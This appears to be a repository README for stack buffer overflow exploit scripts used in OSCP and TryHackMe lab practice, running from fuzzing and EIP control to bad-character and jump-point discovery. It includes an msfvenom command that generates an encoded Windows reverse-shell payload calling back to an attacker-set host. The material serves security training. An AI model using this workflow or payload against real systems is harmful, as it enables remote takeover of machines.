# BufferOverflow
Buffer Overflow Scripts for OSCP and https://www.tryhackme.com/room/bufferoverflowprep


*   Make dir in which files should be copied and execute
    `/opt/bufferOverflow/bash_scripts/prepare.sh`
    TODO: Set prefix

*   Always run Immunity Debugger as Admin in order to see admin services
    Open script and Press F9 to continue (script is paused at the beginning)
*   Execute mona script (not neccessarily needed afaik)
    `!mona config -set workingfolder c:\mona\%p`

*   Find offset that crashes the applications
    `python3 fuzzer.py`

*   Control EIP
    len: Bytes to crash + 400:
    `pattern_create.rb -l <len>`
    Enter payload into payload variable in exploit_1.py
    Re-open immunity debugger & scripts
    `python3 exploit_1.py`
    `!mona findmsp -distance <len>`
    EIP contains normal pattern : ... (offset XXXX)
    <!-- Enter offset in exploit_2.py -->
    Set offset with this script
    `bash_scripts/set-offset.sh`
    Restart imminuity debugger + F9,
    `python3 exploit_2.py`
    verify whether EIP is now 42424242 ("BBBB")

*   Finding Bad Characters (OSCP version)
    Restart immunity debugger + F9
    Enter offset in exploit_3.py
    `python3 exploit_3.py`
    ID: ESP Address - right click - Follow in dump
    Find first bad char in bottom left windows, remove it and repeat

*   Finding a jump point
    Don't need to restart immunity debugger
    `!mona jmp -r esp -cpb "\x00 <AND ALL BAD CHARS>"`
    view -> log
    Pick an address, enter it in exploit_4.py

*   Generate Payload
    `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 EXITFUNC=thread -b "\x00<BAD-CHARS>" –e x86/shikata_ga_nai -f c`
    Enter in payload in exploit_4.py


*   Notes
    *   Could not connect -> F9 to resume the debugger

---

## Easter-Egg
My deploy key with the username kali@kali is associated with the git user arponsarker.
